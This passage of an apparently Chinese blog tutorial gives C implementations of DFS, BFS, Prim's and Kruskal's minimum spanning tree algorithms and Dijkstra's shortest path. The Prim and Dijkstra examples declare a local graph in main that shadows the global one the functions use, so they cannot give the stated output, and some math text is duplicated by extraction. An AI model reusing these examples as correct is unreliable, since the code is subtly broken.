class="hljs-type">bool</span> visited[MAX_VERTICES])</span> </span>&#123;<br>    visited[vertex] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vertex);<br><br>    <span class="hljs-comment">// 访问当前节点的所有邻接节点</span><br>    AdjListNode* temp = graph-&gt;adjLists[vertex].head;<br>    <span class="hljs-keyword">while</span> (temp) &#123;<br>        <span class="hljs-keyword">if</span> (!visited[temp-&gt;vertex]) &#123;<br>            <span class="hljs-built_in">DFS</span>(graph, temp-&gt;vertex, visited);<br>        &#125;<br>        temp = temp-&gt;next;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-comment">// 栈的实现</span><br><span class="hljs-type">int</span> stack[MAX_VERTICES];<br><span class="hljs-type">int</span> top = <span class="hljs-number">-1</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> vertex)</span> </span>&#123;<br>    stack[++top] = vertex;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack[top--];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isStackEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// 深度优先搜索（DFS）非递归版本</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS_Stack</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> startVertex)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> visited[MAX_VERTICES] = &#123;<span class="hljs-literal">false</span>&#125;; <span class="hljs-comment">// 记录节点是否访问过</span><br>    <span class="hljs-built_in">push</span>(startVertex);<br>    visited[startVertex] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">isStackEmpty</span>()) &#123;<br>        <span class="hljs-type">int</span> vertex = <span class="hljs-built_in">pop</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vertex);<br><br>        <span class="hljs-comment">// 访问当前节点的所有邻接节点</span><br>        AdjListNode* temp = graph-&gt;adjLists[vertex].head;<br>        <span class="hljs-keyword">while</span> (temp) &#123;<br>            <span class="hljs-keyword">if</span> (!visited[temp-&gt;vertex]) &#123;<br>                <span class="hljs-built_in">push</span>(temp-&gt;vertex);<br>                visited[temp-&gt;vertex] = <span class="hljs-literal">true</span>;<br>            &#125;<br>            temp = temp-&gt;next;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>广度优先遍历（BFS）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_QUEUE_SIZE 100</span><br><br><span class="hljs-comment">// 队列结构</span><br><span class="hljs-type">int</span> queue[MAX_QUEUE_SIZE];<br><span class="hljs-type">int</span> front = <span class="hljs-number">0</span>, rear = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">enqueue</span><span class="hljs-params">(<span class="hljs-type">int</span> vertex)</span> </span>&#123;<br>    queue[rear++] = vertex;<br>&#125;<br><br><span class="hljs-comment">// 出队操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dequeue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue[front++];<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> front == rear;<br>&#125;<br><br><span class="hljs-comment">// 广度优先搜索（BFS）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> startVertex)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> visited[MAX_VERTICES] = &#123;<span class="hljs-literal">false</span>&#125;; <span class="hljs-comment">// 记录节点是否访问过</span><br>    <span class="hljs-built_in">enqueue</span>(startVertex);<br>    visited[startVertex] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">isEmpty</span>()) &#123;<br>        <span class="hljs-type">int</span> vertex = <span class="hljs-built_in">dequeue</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vertex);<br><br>        <span class="hljs-comment">// 访问当前节点的所有邻接节点</span><br>        AdjListNode* temp = graph-&gt;adjLists[vertex].head;<br>        <span class="hljs-keyword">while</span> (temp) &#123;<br>            <span class="hljs-keyword">if</span> (!visited[temp-&gt;vertex]) &#123;<br>                <span class="hljs-built_in">enqueue</span>(temp-&gt;vertex);<br>                visited[temp-&gt;vertex] = <span class="hljs-literal">true</span>;<br>            &#125;<br>            temp = temp-&gt;next;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="最小生成树（MST）"><a href="#最小生成树（MST）" class="headerlink" title="最小生成树（MST）"></a>最小生成树（MST）</h3><p>对于一个<strong>连接图</strong>，<strong>最小生成树</strong>是图中所有顶点的一个子集，它包括图中所有的顶点，并且是一个<strong>无环</strong>的树。最小生成树的边的总权重是最小的。</p><p>算法：</p><ol><li><p><strong>Prim 算法</strong></p></li><li><p><strong>Kruskal 算法</strong></p></li><li><p><strong>Prim 算法</strong></p></li></ol><p><strong>Prim 算法</strong>通过从一个顶点开始，逐步将最小的边加入生成树，直到所有顶点都在树中。每次都选择当前生成树与剩余顶点之间的最小边。</p><p><strong>Prim 算法的步骤</strong>：</p><ol><li>从任意一个顶点（例如顶点 0）开始，标记为已访问。</li><li>每次选择一个已经加入生成树的顶点，通过它与尚未加入树的顶点之间的最小边，将一个新顶点加入生成树。</li><li>重复步骤 2，直到所有顶点都加入生成树。</li></ol><p><strong>数据结构</strong>：</p><ul><li><strong>邻接矩阵</strong>或<strong>邻接表</strong>来存储图。</li><li><strong>最小堆</strong>或<strong>优先队列</strong>用于高效地选择最小边。</li></ul><p><strong>Prim 算法（使用邻接矩阵实现）</strong>：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES];  <span class="hljs-comment">// 邻接矩阵</span><br><span class="hljs-type">int</span> parent[MAX_VERTICES];  <span class="hljs-comment">// 用来存储最小生成树中每个顶点的父节点</span><br><span class="hljs-type">int</span> key[MAX_VERTICES];     <span class="hljs-comment">// 用来存储连接已加入树的顶点和未加入树的顶点的最小边的权值</span><br><br><span class="hljs-comment">// 找到当前没有被加入生成树的顶点中，最小边的权值的顶点</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minKey</span><span class="hljs-params">(<span class="hljs-type">int</span> key[], <span class="hljs-type">bool</span> mstSet[], <span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-type">int</span> min = INT_MAX, minIndex;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>        <span class="hljs-keyword">if</span> (!mstSet[v] &amp;&amp; key[v] &lt; min) &#123;<br>            min = key[v];<br>            minIndex = v;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> minIndex;<br>&#125;<br><br><span class="hljs-comment">// Prim 算法</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">primMST</span><span class="hljs-params">(<span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> mstSet[MAX_VERTICES];  <span class="hljs-comment">// 用来标记顶点是否已加入生成树</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        key[i] = INT_MAX;  <span class="hljs-comment">// 初始化 key 数组为无穷大</span><br>        mstSet[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 初始时，所有顶点都不在生成树中</span><br>    &#125;<br>    key[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 从顶点 0 开始</span><br>    parent[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>; <span class="hljs-comment">// 顶点 0 没有父节点</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; count &lt; numVertices - <span class="hljs-number">1</span>; count++) &#123;<br>        <span class="hljs-type">int</span> u = <span class="hljs-built_in">minKey</span>(key, mstSet, numVertices); <span class="hljs-comment">// 找到最小的 key 值的顶点 u</span><br>        mstSet[u] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 将顶点 u 加入到生成树中</span><br><br>        <span class="hljs-comment">// 更新与 u 相邻的所有未加入生成树的顶点的 key 值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[u][v] &amp;&amp; !mstSet[v] &amp;&amp; graph[u][v] &lt; key[v]) &#123;<br>                key[v] = graph[u][v]; <span class="hljs-comment">// 更新 key 值</span><br>                parent[v] = u;        <span class="hljs-comment">// 更新父节点</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 打印最小生成树的边</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Edge \tWeight\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d - %d \t%d\n&quot;</span>, parent[i], i, graph[i][parent[i]]);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">5</span>;<br><br>    <span class="hljs-comment">// 示例图</span><br>    <span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>&#125;,<br>        &#123;<span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">primMST</span>(numVertices);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>Kruskal 算法</strong></li></ol><p><strong>Kruskal 算法</strong>是另一种常见的最小生成树算法，它通过边的方式来构建生成树。算法的核心思想是<strong>按边的权重从小到大排序</strong>，然后逐一添加边到生成树中，前提是不会形成环（使用并查集判断是否形成环）。</p><p><strong>Kruskal 算法的步骤</strong>：</p><ol><li>将图中的所有边按权重升序排列。</li><li>使用 <strong>并查集（Union-Find）</strong> 来判断两个顶点是否属于同一个连通分量。</li><li>按照权重从小到大的顺序，依次添加边到生成树中，若添加的边不会形成环，则将边加入生成树。</li><li>重复上述步骤直到生成树包含 V−1V - 1V−1 条边。</li></ol><p><strong>数据结构</strong>：</p><ul><li><strong>边列表</strong>：存储图的所有边。</li><li><strong>并查集（Union-Find）</strong>：用于判断是否形成环。</li></ul><p><strong>Kruskal 算法（使用边列表和并查集实现）</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-comment">// 边结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> u, v, weight;<br>&#125; Edge;<br><br><span class="hljs-comment">// 并查集查找函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> parent[], <span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (parent[i] == <span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> i;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">find</span>(parent, parent[i]);<br>&#125;<br><br><span class="hljs-comment">// 并查集合并函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unionSets</span><span class="hljs-params">(<span class="hljs-type">int</span> parent[], <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-type">int</span> xroot = <span class="hljs-built_in">find</span>(parent, x);<br>    <span class="hljs-type">int</span> yroot = <span class="hljs-built_in">find</span>(parent, y);<br>    <span class="hljs-keyword">if</span> (xroot != yroot)<br>        parent[xroot] = yroot;<br>&#125;<br><br><span class="hljs-comment">// 边的比较函数，用于排序</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* a, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ((Edge*)a)-&gt;weight - ((Edge*)b)-&gt;weight;<br>&#125;<br><br><span class="hljs-comment">// Kruskal 算法</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">kruskalMST</span><span class="hljs-params">(Edge edges[], <span class="hljs-type">int</span> numEdges, <span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-built_in">qsort</span>(edges, numEdges, <span class="hljs-built_in">sizeof</span>(Edge), compare);  <span class="hljs-comment">// 按权重排序所有边</span><br><br>    <span class="hljs-type">int</span> parent[MAX_VERTICES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++)<br>        parent[i] = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 初始化并查集</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Edge \tWeight\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> mstWeight = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numEdges; i++) &#123;<br>        <span class="hljs-type">int</span> u = edges[i].u;<br>        <span class="hljs-type">int</span> v = edges[i].v;<br>        <span class="hljs-type">int</span> weight = edges[i].weight;<br>        <span class="hljs-type">int</span> setU = <span class="hljs-built_in">find</span>(parent, u);<br>        <span class="hljs-type">int</span> setV = <span class="hljs-built_in">find</span>(parent, v);<br>        <span class="hljs-keyword">if</span> (setU != setV) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d - %d \t%d\n&quot;</span>, u, v, weight);<br>            <span class="hljs-built_in">unionSets</span>(parent, setU, setV);  <span class="hljs-comment">// 将两个集合合并</span><br>            mstWeight += weight;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Total weight of MST: %d\n&quot;</span>, mstWeight);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 示例图，4个顶点和5条边</span><br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> numEdges = <span class="hljs-number">5</span>;<br><br>    Edge edges[] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;,<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>&#125;,<br>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">kruskalMST</span>(edges, numEdges, numVertices);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最短路径算法"><a href="#最短路径算法" class="headerlink" title="最短路径算法"></a>最短路径算法</h4><ol><li>Dijkstra 算法</li></ol><p><strong>Dijkstra 算法</strong>是一个贪心算法，用于计算一个图中单源最短路径的问题，即从一个起始节点出发，计算到所有其他节点的最短路径。该算法适用于图中没有负权边的情况。</p><p>Dijkstra 算法的步骤：</p><ol><li>初始化一个距离数组 <code>dist[]</code>，用来存储源节点到各个节点的最短距离。起始节点的距离设置为 0，其他节点的距离设置为无限大。</li><li>使用一个优先队列（或最小堆）来选取当前未处理的、具有最小 <code>dist[]</code> 值的节点。</li><li>从当前节点出发，更新所有相邻节点的最短距离，如果发现更小的距离，则更新。</li><li>重复以上步骤直到所有节点都被访问过。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF INT_MAX</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES];  <span class="hljs-comment">// 邻接矩阵</span><br><span class="hljs-type">int</span> dist[MAX_VERTICES];  <span class="hljs-comment">// 源节点到其他节点的最短路径</span><br><span class="hljs-type">bool</span> visited[MAX_VERTICES];  <span class="hljs-comment">// 记录节点是否已被访问</span><br><br><span class="hljs-comment">// Dijkstra 算法</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">(<span class="hljs-type">int</span> numVertices, <span class="hljs-type">int</span> start)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        dist[i] = INF;  <span class="hljs-comment">// 初始化所有顶点的最短路径为无限大</span><br>        visited[i] = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 初始化所有顶点为未访问</span><br>    &#125;<br><br>    dist[start] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 起点到起点的距离是 0</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; count &lt; numVertices - <span class="hljs-number">1</span>; count++) &#123;<br>        <span class="hljs-comment">// 找到距离起点最近的未访问顶点</span><br>        <span class="hljs-type">int</span> u = <span class="hljs-number">-1</span>, minDist = INF;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (!visited[v] &amp;&amp; dist[v] &lt; minDist) &#123;<br>                u = v;<br>                minDist = dist[v];<br>            &#125;<br>        &#125;<br><br>        visited[u] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 标记当前顶点为已访问</span><br><br>        <span class="hljs-comment">// 更新与当前顶点相邻的顶点的最短路径</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[u][v] &amp;&amp; !visited[v] &amp;&amp; dist[u] + graph[u][v] &lt; dist[v]) &#123;<br>                dist[v] = dist[u] + graph[u][v];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 打印最短路径</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vertex \t Distance from source\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d \t %d\n&quot;</span>, i, dist[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">5</span>;<br><br>    <span class="hljs-comment">// 示例图的邻接矩阵表示</span><br>    <span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">30</span>, <span class="hljs-number">100</span>&#125;,<br>        &#123;<span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">10</span>&#125;,<br>        &#123;<span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">60</span>&#125;,<br>        &#123;<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">dijkstra</span>(numVertices, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 从顶点 0 开始计算最短路径</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*Vertex Distance from source</span><br><span class="hljs-comment">0  0</span><br><span class="hljs-comment">1  10</span><br><span class="hljs-comment">2  60</span><br><span class="hljs-comment">3  30</span><br><span class="hljs-comment">4  70</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p> Floyd-Warshall 算法</p><p>Floyd-Warshall 算法的步骤：</p><ol><li>初始化一个距离矩阵 <code>dist[][]</code>，将所有边的权值赋给相应位置。如果没有边，赋值为无限大。</li><li>对于每一对顶点 i,ji, ji,j，检查是否有一个中间顶点 kkk，使得通过 kkk 达到 jjj 的路径比直接从 iii 到 jjj 的路径更短。如果是，则更新 <code>dist[i][j]</code>。</li><li>重复上述过程，直到找到所有顶点对的最短路径。</li></ol><figure 